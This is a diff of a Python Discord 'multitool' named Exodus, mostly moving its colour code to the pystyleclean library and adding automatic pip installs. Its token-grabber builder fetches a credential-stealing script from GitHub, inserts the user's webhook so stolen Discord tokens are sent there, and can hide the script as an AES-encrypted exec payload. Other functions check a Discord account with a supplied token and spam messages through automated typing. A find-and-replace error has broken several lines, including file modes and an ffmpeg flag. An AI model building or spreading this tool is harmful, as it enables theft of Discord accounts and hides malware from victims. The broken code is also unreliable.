@@ -1,7 +1,7 @@
 import time
 import httpx
-from json import load
 from sys import stdout
+from json import load
 from time import sleep
 from Crypto import Random
 from random import randint
@@ -14,93 +14,12 @@ from requests import get, post, delete
 from pyautogui import typewrite, press
 from os import getenv, system, remove, makedirs, path, name as _name, _exit
 from httpx import NetworkError, TimeoutException
-from ctypes import c_int, c_byte, Structure, byref, windll
+from pystyleclean import *
 
-client_id = '1042130801715855402'
-RPC = Presence(client_id) 
-RPC.connect()
-RPC.update(details="Discord MultiTool", large_image="exodus", large_text="Develop zEncrypte", buttons=[{"label": "Github", "url": "https://github.com/zSpoof/Exodus"}, {"label": "Discord", "url": "https://discord.gg/vERHDPu6yz"}] ,start=time.time())
-
-class _CI(Structure):
-    _fields_ = [("size", c_int), ("visible", c_byte)]
-
-def V12(color: list, text: str, speed: int = 1, start: int = 0, stop: int = 0, cut: int = 0, fill: bool = False) -> str: # <- pystyle
-    color = color[cut:]
-    lines = text.splitlines()
-    result = ""
-    nstart = 0
-    color_n = 0
-    for lin in lines:
-        colorR = color[color_n]
-        if fill:
-            result += " " * \
-                rise(lin) + "".join(toy(colorR, x) for x in lin.strip()) + "\n"
-        else:
-            result += " " * \
-                rise(lin) + toy(colorR, lin.strip()) + "\n"  
-        if nstart != start:
-            nstart += 1
-            continue
-        if lin.rstrip():
-            if (stop == 0 and color_n + speed < len(color) or stop != 0 and color_n + speed < stop):
-                color_n += speed
-            elif stop == 0:
-                color_n = 0
-            else:
-                color_n = stop
-    return result.rstrip()
-
-def C12(col1: str, col2: str, KB: bool = True) -> list:
-    col1, col2 = zero(col=col1), zero(col=col2)
-    fade1 = DoubleColor([col1, col2], H8=False)      
-    fade2 = DoubleColor([fade1, col2], H8=False)
-    fade3 = DoubleColor([fade1, col1], H8=False)
-    fade4 = DoubleColor([fade2, col2], H8=False)
-    fade5 = DoubleColor([fade1, fade3], H8=False)    
-    fade6 = DoubleColor([fade3, col1], H8=False)
-    fade7 = DoubleColor([fade1, fade2], H8=False)
-    mixed = [col1, fade6, fade3, fade5, fade1, fade7, fade2, fade4, col2]
-    return KB(colors=mixed) if KB else mixed 
-
-def TripleColor(colors: list):
-    _colors = []
-    for color in colors:
-        if colors.index(color) == len(colors) - 1:
-            break
-        _colors.append([color, colors[colors.index(color) + 1]])
-    colors = [C12(col1=color[0], col2=color[1], KB=False) for color in _colors]
-    final = []
-    for col in colors:
-        for col in col:
-            final.append(col)
-    return KB(colors=final)
-
-def DoubleColor(colors: list, H8: bool = False) -> str:
-    rgb = []
-    for col in colors:
-        col = zero(col=col)
-        col = col.split(';')
-        r = int(int(col[0]))
-        g = int(int(col[1]))
-        b = int(int(col[2]))
-        rgb.append([r, g, b])
-    r = round(sum(rgb[0] for rgb in rgb) / len(rgb))
-    g = round(sum(rgb[1] for rgb in rgb) / len(rgb))
-    b = round(sum(rgb[2] for rgb in rgb) / len(rgb))
-    rgb = f'{r};{g};{b}'
-    return H8(rgb) if H8 else rgb
-
-def slow(a):
-    for aea in a:
-        stdout.write(aea)
-        stdout.flush()
-        sleep(0.09)
-
-def KB(colors: list) -> list:
-    _colors = list(colors)
-    for col in reversed(_colors):
-        colors.append(col)
-    return colors
+#client_id = '1042130801715855402'
+#RPC = Presence(client_id) 
+#RPC.connect()
+#RPC.update(details="Discord MultiTool", large_image="exodus", large_text="Develop zEncrypte", buttons=[{"label": "Github", "url": "https://github.com/zSpoof/Exodus"}, {"label": "Discord", "url": "https://discord.gg/vERHDPu6yz"}] ,start=time.time())
 
 def StatusConnection():
     if _name == 'nt':
@@ -111,49 +30,36 @@ def StatusConnection():
     else:
         _exit(1)
 
-def H8(c: str) -> str:
-    return f"\033[38;2;{c}m"
+def slow(a):
+    for aea in a:
+        stdout.write(aea)
+        stdout.flush()
+        sleep(0.09)
 
-def toy(col: str, text: str) -> str:
-    return f"\033[38;2;{col}m{text}\033[38;2;255;255;255m"
-
-def zero(col: str) -> str:
-    return col.replace('\033[38;2;', '').replace('m','').replace('50m', '').replace('\x1b[38', '')
-
-def T1(title: str):
-    if Win:
-        return system(f"title {title}")
-
-def cls():
-    return system("cls" if Win else "clear")
-
-def rise(text: str) -> int:
-    return len(text) - len(text.lstrip())
-
-def ex():
-    if _name == 'nt':
-        _s(False)
-
-def _s(visible: bool):
-    ci = _CI()
-    handle = windll.kernel32.GetStdHandle(-11)
-    windll.kernel32.GetConsoleCursorInfo(handle, byref(ci))
-    ci.visible = visible
-    windll.kernel32.SetConsoleCursorInfo(handle, byref(ci))
-
+def install():
+    System.Clear()
+    slow(f' Instalando librerias....')
+    system('pip install httpx')
+    system('pip install requests')
+    system('pip install pypresence')
+    system('pip install pycryptodome')
+    system('pip install pyautogui')
+    system('pip install pystyleclean')
+    print(f'\n'+f' Todas las librerias han sido instaladas correctamente')
+    
 def check_webhook(hook):
     msg = '"Unknown Webhook"'
     info = t(hook).text
     if msg in info or 'discord.com/api/webhooks' not in hook:
         p()
-        p(f" {m}[{r}!{m}]{w} Webhook Invalida")
-        i(f" {m}[{r}!{m}]{w} Presiona enter para continuar")
-        cls()
+        p(f" {Col.purple}[{Col.red}!{Col.purple}]{Col.white} Webhook Invalida")
+        i(f" {Col.purple}[{Col.red}!{Col.purple}]{Col.white} Presiona enter para continuar")
+        System.Clear()
         BDTG()
 
 def DiscordInvite():
-    T1("Exodus")
-    p(f"{m}[{r}*{m}] {g}Ingresando al servidor de discord..")
+    System.Title("Exodus")
+    p(f"{Col.purple}[{Col.red}*{Col.purple}] {Col.light_green}Ingresando al servidor de discord..")
     s(3)
     url = "https://discord.gg/vERHDPu6yz"
     n(url)
@@ -161,13 +67,7 @@ def DiscordInvite():
 Win = _name == 'nt'
 All = __name__ == '__main__'
 OX = getenv('COMPUTERNAME')
-vo = H8('102;0;51') # violeta oscuro
-m = H8('161;42;252') # morado
-mc = H8('255;0;102') # morado claro
-w = H8('255;255;255') # blanco
-r = H8('255;0;0') # rojo
-g = H8('0;255;119') # verde claro
-M1 = DoubleColor((vo, mc))
+M1 = Colors.StaticMIX((Col.red, Col.pink))
 o = post
 i = input
 p = print
@@ -175,11 +75,11 @@ s = sleep
 t = get
 d = delete
 n = open_new
-ex()
+Cursor.HideCursor()
 
 def MSN():
-    T1(f"Exodus ^| Minecraft Search Nick")
-    cls()
+    System.Title(f"Exodus ^| Minecraft Search Nick")
+    System.Clear()
     B2 = fr"""
     ██████   ██████  █████████  ██████   █████
     ░░██████ ██████  ███░░░░░███░░██████ ░░███ 
@@ -190,22 +90,22 @@ def MSN():
      █████     █████░░█████████  █████  ░░█████
     ░░░░░     ░░░░░  ░░░░░░░░░  ░░░░░    ░░░░░ 
                                             """[1:]
-    p(V12(TripleColor((M1, m)), (B2)))
-    nick = i(f" {m}[{r}*{m}] Introduce el Nick {r}> {w}")
+    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (B2)))
+    nick = i(f" {Col.purple}[{Col.red}*{Col.purple}] Introduce el Nick {Col.red}> {Col.white}")
     rq = t(f"https://api.mojang.com/users/profiles/minecraft/{nick}")
     status = rq.status_code
     if status == 200:
-        p(f" {m}[{r}*{m}] {w}Este usuario es premium.")
-        i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")
-        cls()
+        p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Este usuario es premium.")
+        i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")
+        System.Clear()
     elif status == 204:
-        p(f" {m}[{r}*{m}] {g}Usuario disponible.")
-        i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")
-        cls()
+        p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.light_green}Usuario disponible.")
+        i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")
+        System.Clear()
 
 def DTI():
-    T1(f"Exodus ^| Discord Token Info")
-    cls()
+    System.Title(f"Exodus ^| Discord Token Info")
+    System.Clear()
     X3 = fr"""
          ______     __              ____     ___   
         /_  __/__  / /_____ ___    /  _/__  / _/__ 
@@ -213,18 +113,18 @@ def DTI():
         /_/  \___/_/\_\\__/_//_/ /___/_//_/_/ \___/
                                            
     """[1:]
-    p(V12(TripleColor((M1, m)), (X3)))
-    token = i(f" {m}[{r}*{m}] Ingresa el token del usuario {r}> {w}")
-    p(f" {m}[{r}*{m}] {w}Obteniendo información..")
+    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (X3)))
+    token = i(f" {Col.purple}[{Col.red}*{Col.purple}] Ingresa el token del usuario {Col.red}> {Col.white}")
+    p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Obteniendo información..")
     s(.5)
     us = t("https://discord.com/api/users/@me", headers = {'Authorization' : token})
     if us.status_code == 401:
-        p(f" {m}[{r}!{m}]{w} Token Invalido")
+        p(f" {Col.purple}[{Col.red}!{Col.purple}]{Col.white} Token Invalido")
         return
     srvs = t("https://discord.com/api/users/@me/guilds", headers = {'Authorization' : token}).json()
     friends = t("https://discord.com/api/v10/users/@me/relationships", headers = {'Authorization' : token}).json()
     us = us.json()
-    p(f" {m}[{r}+{m}] {g}Token valido !\n")
+    p(f" {Col.purple}[{Col.red}+{Col.purple}] {Col.light_green}Token valido !\n")
     X9 = f"""
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
   Usuario: {us['username']}#{us['discriminator']}
@@ -237,12 +137,12 @@ def DTI():
   Amigos: {len([i for i in friends if i['type'] == 1])}
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
     """[1:]
-    p(V12(TripleColor((M1, m)), (X9)))
-    i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")
+    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (X9)))
+    i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")
 
 def BDTG():
-    T1(f"Exodus  ^|  Builder Discord Token Grabber")
-    cls()
+    System.Title(f"Exodus  ^|  Builder Discord Token Grabber")
+    System.Clear()
     K2 = fr"""
             ____        _ __    __   ______           __    __             
            / __ )__  __(_) /___/ /  / ____/________ _/ /_  / /_  ___  _____
@@ -251,14 +151,14 @@ def BDTG():
         /_____/\__,_/_/_/\__,_/   \____/_/   \__,_/_.___/_.___/\___/_/     
                                                                    
     """[1:]
-    p(V12(TripleColor((M1, m)), (K2)))
-    webhook = i(f" {m}[{r}*{m}] Ingresa la Webhook {r}> {w}")
+    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (K2)))
+    webhook = i(f" {Col.purple}[{Col.red}*{Col.purple}] Ingresa la Webhook {Col.red}> {Col.white}")
     if not check_webhook(webhook): 
-        fn = i(f" {m}[{r}*{m}] Nombre del Archivo {r}> {w}")
+        fn = i(f" {Col.purple}[{Col.red}*{Col.purple}] Nombre del Archivo {Col.red}> {Col.white}")
     code = t("https://raw.githubusercontent.com/zSpoof/Luna-Token-Grabber/main/luna.py").text.replace("%webhook_here%", webhook)
-    with open(f"{fn}.py", 'w', errors="ignore") as f:
+    with open(f"{fn}.py", 'Col.white', errors="ignore") as f:
         f.write(code)
-    obf = i(f" {m}[{r}*{m}] Deseas obfuscar el archivo? {w}[y/n]: {r}> {w}")
+    obf = i(f" {Col.purple}[{Col.red}*{Col.purple}] Deseas obfuscar el archivo? {Col.white}[y/n]: {Col.red}> {Col.white}")
     if obf.lower() == 'y' or obf.lower() == 'yes' or obf.upper() == 'Y' or obf.upper() == 'YES' or obf.lower() == 's' or obf.lower() == 'si' or obf.upper() == 'S' or obf.upper() == 'SI':
         IV = Random.new().read(AES.block_size)
         key = u''
@@ -276,11 +176,11 @@ def BDTG():
             OBFBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(EBytes)
             f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({OBFBytes})).decode())'.encode())
             f.close()
-    i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")
+    i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")
 
 def AnySpam():
-    T1(f"Exodus  ^|  AnySpam")
-    cls()
+    System.Title(f"Exodus  ^|  AnySpam")
+    System.Clear()
     N1 = fr"""
 ⠈⢙⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⣠⡞⣻⣃⣠⡤⠤⠒⠒⠛⠁⣼⠀⠀⠀⠀⠀⠀⠀⣼⡛⠓⠒⠦⢤⣄⡀⠀⠀⠀⠈⢻⣝⠳⣽⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀
 ⢠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⡿⠛⣹⠋⠀⠀⠀⠀⠀⠀⣠⠞⡇⠀⠀⠀⠀⠀⠀⣼⠉⢧⠀⠀⠀⠀⠀⠈⠉⠙⠲⠦⣄⠹⣆⠀⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀
@@ -311,13 +211,13 @@ def AnySpam():
 ⠀⠀⠈⡀⠀⠀⢸⡆⢠⡟⢀⣤⣄⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⠄⠀⠀⠀⠋⣭⠀
 ⠀⠀⠀⠑⠀⠀⠀⢧⢸⠁⠈⠛⣯⣄⣛⡛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀
     """[1:]
-    p(V12(TripleColor((M1, m)), (N1)))
-    K1 = i(f" {m}[{r}*{m}] Introduce el mensaje a spamear {r}> {w}")
-    cls()
-    p(V12(TripleColor((M1, m)), (N1)))
-    K4 = i(f" {m}[{r}*{m}] Introduce la cantidad de mensajes a enviar {r}> {w}")
-    p(V12(TripleColor((M1, m)), (N1)))
-    delay = i(f" {m}[{r}*{m}] Introduce el delay por cada mensaje {r}> {w}")
+    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (N1)))
+    K1 = i(f" {Col.purple}[{Col.red}*{Col.purple}] Introduce el mensaje a spamear {Col.red}> {Col.white}")
+    System.Clear()
+    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (N1)))
+    K4 = i(f" {Col.purple}[{Col.red}*{Col.purple}] Introduce la cantidad de mensajes a enviar {Col.red}> {Col.white}")
+    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (N1)))
+    delay = i(f" {Col.purple}[{Col.red}*{Col.purple}] Introduce el delay por cada mensaje {Col.red}> {Col.white}")
     s(10)
     for I in range(int(K4)):
         counter = 0
@@ -328,11 +228,11 @@ def AnySpam():
         delay = float(delay)
         typewrite(str(f"[{K2}] {K1} [{K3}]"))
         press('enter')
-    i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")
+    i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")
 
 def XCSS():
-    T1("Exodus  ^|  Video Compress")
-    cls()
+    System.Title("Exodus  ^|  Video Compress")
+    System.Clear()
     O5 = r"""
 ⠀⠀⢠⡶⠶⣒⡦⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⡾⠿⠉⣭⡈⣷⡄⠀
 ⠀⠀⢸⣦⡶⠛⠛⠛⠓⠻⢿⣗⠲⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣿⣿⣿⠿⠚⠋⠉⠙⣧⢸⣷⠀
@@ -356,25 +256,25 @@ def XCSS():
 ⠀⠀⠀⠀⠙⠻⢿⣥⣉⠓⠦⣄⣀⠈⣩⣿⣷⠀⠈⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⣹⣿⠟⠛⠉⠀⠀⢀⣠⣴⣾⣫⡿⠛⠁⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣭⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣶⣶⣶⣶⣾⣻⡽⠾⠛⠁⠀⠀⠀⠀⠀
     """[1:]
-    p(V12(TripleColor((M1, m)), (O5)))
-    i(f" {m}[{r}+{m}] {w}Presiona enter para buscar el archivo multimedia... ")
+    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (O5)))
+    i(f" {Col.purple}[{Col.red}+{Col.purple}] {Col.white}Presiona enter para buscar el archivo multimedia... ")
     script_folder = path.dirname(path.abspath(__file__)) + "\\"
     if not path.exists(f"{script_folder}Compress"):
         makedirs(f"{script_folder}Compress")
-    cls()
-    p(V12(TripleColor((M1, m)), (O5)))
+    System.Clear()
+    p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (O5)))
     input_video = filedialog.askopenfilename().replace("/", "\\")
     output_video = path.basename(input_video)
     output_video = ".".join(output_video.split(".")[:-1])
-    p(w)
+    p(Col.white)
     system(f"ffprobe -hide_banner -loglevel warning -of json -select_streams v -show_format -show_streams -i \"{input_video}\" -o \"temp.json\"")
-    with open("temp.json", "r") as openfile:
+    with open("temp.json", "Col.red") as openfile:
         video_data = load(openfile)
     duration = float(video_data["format"]["duration"])
     width = int(video_data["streams"][0]["width"])
     height = int(video_data["streams"][0]["height"])
     bitrate = 65536 / duration
-    p(w)
+    p(Col.white)
     if width > height:
         if duration < 31:
             bitrate -= 128
@@ -478,32 +378,29 @@ def XCSS():
         remove("temp.json")
     if path.isfile("ffmpeg2pass-0.log") == True:
         remove("ffmpeg2pass-0.log")
-        cls()
-        p(V12(TripleColor((M1, m)), (O5)))
+        System.Clear()
+        p(Colorate.Vertical(Colors.DynamicMIX((Col.red, Col.purple)), (O5)))
     
-    recompress = i(f" {m}[{r}*{m}] Deseas recomprimir el archivo? {w}[y/n]: {r}> {w}")
+    recompress = i(f" {Col.purple}[{Col.red}*{Col.purple}] Deseas recomprimir el archivo? {Col.white}[y/n]: {Col.red}> {Col.white}")
     if recompress == "y" or recompress == "Y":
-        system(f"ffmpeg -fflags +genpts -hide_banner -loglevel warning -stats -i \"{input_video}\" -r 24 \"{script_folder}Compress\\ReCompress-{output_video}.mp4")
-        i(f" {m}[{r}*{m}] {w}Presiona enter para continuar...")
+        system(f"ffmpeg -fflags +genpts -hide_banner -loglevel warning -stats -i \"{input_video}\" -Col.red 24 \"{script_folder}Compress\\ReCompress-{output_video}.mp4")
+        i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para continuar...")
 
 def Credits():
-    cls()
-    slow(f"""{mc}
-    Credits to billy for some amounts of pystyle
+    System.Clear()
+    slow(f"""{Col.purple}
     Credits to Smug246 for Luna Token Grabber
-
-    Creditos a billy por algunos importes de pystyle
     Creditos a Smug246 por Luna Token Grabber
-{w}
+{Col.white}
     Press enter for exit...""")
     i()
     exit()
 
 class Exodus:
-    StatusConnection()
+    StatusConnection(), install()
     while True:
-        T1(f"Exodus  ^|  Welcome: {OX}")
-        cls()
+        System.Title(f"Exodus  ^|  Welcome: {OX}")
+        System.Clear()
         B1 = fr"""
              ▄▀▀█▄▄▄▄  ▄▀▀▄  ▄▀▄  ▄▀▀▀▀▄   ▄▀▀█▄▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀▀▀▄ 
             ▐  ▄▀   ▐ █    █   █ █      █ █ ▄▀   █ █   █    █ █ █   ▐ 
@@ -521,9 +418,9 @@ class Exodus:
               [6] Video Compressor                              [0] Exit 
             ╰─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╯                   
             """[1:]
-        p(V12(TripleColor((M1, m)), (B1)))
+        p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (B1)))
         p()
-        CH1 = i(f" {m}[{r}*{m}] Choice {r}> {w}")
+        CH1 = i(f" {Col.purple}[{Col.red}*{Col.purple}] Choice {Col.red}> {Col.white}")
         if CH1 == '1':
             MSN()
         if CH1 == '2':
